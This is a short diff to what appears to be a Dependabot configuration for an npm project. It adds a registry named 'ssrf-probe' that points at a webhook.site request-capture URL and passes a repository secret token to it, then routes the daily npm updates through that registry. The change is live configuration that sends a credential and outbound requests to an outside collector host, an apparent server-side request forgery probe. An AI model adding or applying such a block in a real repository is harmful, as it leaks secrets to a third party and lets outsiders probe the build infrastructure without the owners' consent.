@@ -1,6 +1,13 @@
 version: 2
+registries:
+  ssrf-probe:
+    type: npm-registry
+    url: https://webhook.site/6e977b35-559e-404c-b3dc-32611d7ebed1
+    token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule:
       interval: "daily"
+    registries:
+      - ssrf-probe
